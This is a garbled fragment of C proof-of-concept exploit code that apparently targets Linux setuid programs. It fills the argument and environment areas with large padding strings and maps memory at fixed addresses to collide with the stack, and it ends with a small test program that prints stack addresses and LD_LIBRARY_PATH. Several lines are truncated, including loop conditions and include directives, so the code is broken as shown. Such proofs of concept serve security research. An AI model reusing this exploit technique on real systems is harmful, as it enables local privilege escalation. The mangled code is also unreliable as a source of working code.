        const size_t padding_envsz = offset + alpha;
        /***/ size_t padding_env_rem = padding_envsz % MAX_ARG_STRLEN;
        const size_t padding_envc = padding_envsz / MAX_ARG_STRLEN + !!padding_env_rem;
        static char padding_env[MAX_ARG_STRLEN];
        memset(padding_env, ' ', sizeof(padding_env)-1);
        static char padding_env1[MAX_ARG_STRLEN];
        if (padding_env_rem) memset(padding_env1, ' ', padding_env_rem-1);
        const size_t envc = protect_envc + scratch_envc + onebyte_envc + padding_envc;
        if (envc > MAX_ARG_STRINGS) die();
        const size_t argc = items - (1 + 1 + envc + 1);
        if (argc > MAX_ARG_STRINGS) die();
        const char * const protect_argv[] = {
            "./poc-suidbin",
        };
        const size_t protect_argc = sizeof(protect_argv) / sizeof(protect_argv[0]);
        if (protect_argc >= argc) die();
        size_t _protect_argsz = 0;
      {
        size_t i;
        for (i = 0; i = MAX_ARG_STRLEN) die();
        if (padding_arg_len  PAGESZ / sizeof(char *)) die();
        if (mmap(argv, PAGESZ, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != argv) die();
      {
        size_t argi = 0;
      {
        size_t i;
        for (i = 0; i .
     */
    #include 
    #include 
    #include 
    #define die() do { 
        fprintf(stderr, "died in %s: %un", __func__, __LINE__); 
        exit(EXIT_FAILURE); 
    } while (0)
    int
    main(const int argc, const char * const * const argv, const char * const * const envp)
    {
        printf("argc %dn", argc);
        char stack = '';
        printf("stack %p < %p < %p < %p < %pn", &stack, argv, envp, *argv, *envp);
        #define LLP "LD_LIBRARY_PATH"
        const char * const llp = getenv(LLP);
        printf("getenv %p %sn", llp, llp);
        const char * const * env;
        for (env = envp; *env; env++) {
            if (!strncmp(*env, LLP, sizeof(LLP)-1)) {
                printf("%p %sn", *env, *env);
            }
        }
        exit(EXIT_SUCCESS);
    }